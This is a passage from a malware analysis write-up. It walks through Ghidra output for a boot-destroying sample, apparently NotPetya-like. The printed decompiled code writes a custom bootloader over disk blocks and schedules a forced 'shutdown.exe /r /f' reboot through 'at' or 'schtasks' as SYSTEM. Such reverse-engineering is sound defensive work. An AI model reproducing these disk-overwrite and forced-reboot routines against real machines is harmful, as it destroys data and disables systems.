                 ff ff
        10001871 a3 f8 f8        MOV        [status_code],EAX                                = ??
                 01 10
        10001876 85 c0           TEST       EAX,EAX
        10001878 78 1b           JS         LAB_10001895
        1000187a 8d 85 68        LEA        EAX=>first_128_bytes_xor_7_len_512,[EBP + 0xff
                 f8 ff ff
        10001880 50              PUSH       EAX
        10001881 8d 85 68        LEA        EAX=>drive_path,[EBP + 0xfffffe68]
                 fe ff ff
        10001887 50              PUSH       EAX
        10001888 6a 22           PUSH       0x22
        1000188a 58              POP        EAX
        1000188b e8 f4 fa        CALL       write_512_offset_EAX                             undefined write_512_offset_EAX(u
                 ff ff
```

From this we can infer that it writes to disk block `0x20` (recall that the argument is left shifted by `9` in the function), disk block `0x21` and disk block `0x22`. Unfortuantely though since all the assignments in this subroutine were giving Ghidra a rather hard time the exact implications are unknown and probably not worth looking into. Afterall, it is probably safe to say that this is the subroutine responsible for writing the custom boot loader to the disk, which is also how we will rename this function to `write_custom_bootloader`.

### Back to destroy_boot

Returning back to the calling function we now have a better idea of the `destroy_boot` function too. It seems appropriate to change its name to also reflect the coordination of writing the custom bootloader, so we rename it to `destroy_boot_and_write_custom_bootloader`.

### Back again to Ordinal_1

After all this we are back in Ordinal_1. The code context we are in is as follows.

```cpp
  if ((granted_privileges & 2) != 0) {
    create_c_windows_file_or_exit();
    destroy_boot_and_write_custom_bootloader();
  }
  FUN_100084df();
```

This means that `FUN_100084df` is next up in our investigation.

### FUN_100084df

```cpp
undefined4 FUN_100084df(void){
  uint uVar1;
  UINT UVar2;
  BOOL BVar3;
  int iVar4;
  wchar_t *pwVar5;
  uint uVar6;
  undefined4 uVar7;
  int iVar8;
  WCHAR local_e2c [1023];
  undefined2 local_62e;
  WCHAR local_62c [780];
  _SYSTEMTIME local_14;
  
  uVar7 = 0;
  GetLocalTime((LPSYSTEMTIME)&local_14);
  uVar1 = FUN_10006973();
  if (uVar1 < 10) {
    uVar1 = 10;
  }
  uVar6 = ((uint)local_14.wHour + (uVar1 + 3) / 0x3c) % 0x18;
  iVar8 = (uint)local_14.wMinute + (uVar1 + 3) % 0x3c;
  UVar2 = GetSystemDirectoryW(local_62c,0x30c);
  if (UVar2 != 0) {
    BVar3 = PathAppendW(local_62c,L"shutdown.exe /r /f");
    if (BVar3 != 0) {
      iVar4 = FUN_10008494();
      if (iVar4 == 0) {
        wsprintfW(local_e2c,L"at %02d:%02d %ws",uVar6,iVar8,local_62c);
      }
      else {
        pwVar5 = L"/RU \"SYSTEM\" ";
        if (((byte)granted_privileges & 4) == 0) {
          pwVar5 = L"";
        }
        wsprintfW(local_e2c,L"schtasks %ws/Create /SC once /TN \"\" /TR \"%ws\" /ST %02d:%02d",
                  pwVar5,local_62c,uVar6,iVar8);
      }
      local_62e = 0;
      uVar7 = FUN_100083bd(0);
    }
  }
  return uVar7;
}
```

The subroutine stars with a call to [GetLocalTime](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getlocaltime) which gets the local date and time.

This call is followed directly by a call to `FUN_10006973`.

### FUN_10006973

```cpp
uint FUN_10006973(void){
  DWORD DVar1;
  uint uVar2;
  
  DVar1 = GetTickCount();
  uVar2 = (uint)(((ulonglong)(DVar1 - millis_since_system_start) / 0x3c) / 1000);
  return -(uint)(uVar2 < first_cmd_arg) & first_cmd_arg - uVar2;
}
```

This function makes a call to [GetTickCount](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-gettickcount) which returns the number of milliseconds elapsed since the system was started. The difference between this value and the similarly obtained value of `millis_since_system_start` gotten when the malware was initially started is then computed and divided by `0x3c` which is `60` followed by `1000`. This effectively makes `uVar2` the number of minutes the malware has been running for.

The return value is weird however. The left side of the `&` results in either `-1` or `0`. While the right side. This effectively makes this statement a switch. Afterall, the value of `-1` written out in binary is all `1's` meaning a bit wise AND on it will keep all bits set in the other value. This means that the actual return value is the difference between `first_cmd_arg` and `uVar2` or `0` if `uVar2` is greater than `first_cmd_arg`. Renaming the function to `minutes_left_before_cmd_arg1_reached` seems fine.

### Back to FUN_100084df

Back to the calling function we then see that if less than `10` minutes are left the value is set to `10` minutes.

Using this value we then see the `wHour` and `wMinute` field being set.

```cpp
uVar6 = ((uint)local_14.wHour + (uVar1 + 3) / 0x3c) % 0x18;
iVar8 = (uint)local_14.wMinute + (uVar1 + 3) % 0x3c;
```

For the hours field the value is first converted from minutes to hours using `0x3c` (`60`). Both values are kept within bounds using a modulus operating with `0x18` (`24`) and `0x3c` (`60`) respectively.



Memory:
- `FUN_100094a5` - only internal reference to `Ordinal_1`
- `FUN_10009590` - difficult to grasp but invokes `FUN_100094a5`
- `FUN_1000835e` - contains a killswitch
- `FUN_10008d5a` - `destroy_boot` rip everyone
- `FUN_10001038` - could be revisited as we now have more information



















